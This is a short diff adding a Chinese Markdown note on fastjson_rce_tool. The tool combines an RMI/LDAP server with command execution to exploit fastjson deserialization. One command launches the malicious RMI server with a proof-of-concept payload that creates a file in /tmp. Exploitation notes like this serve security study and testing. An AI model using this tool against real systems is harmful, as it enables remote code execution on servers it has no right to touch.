@@ -1,0 +1,6 @@
+### fastjson_tool.jar 启用 RMI/LDAP
+[@wyzxxz](https://github.com/wyzxxz/fastjson_rce_tool)
+大佬的tools整合了rmi/ldap+命令执行,
+```
+java -cp fastjson_tool.jar fastjson.HRMIServer 127.0.0.1 9999 "touch /tmp/233"
+```
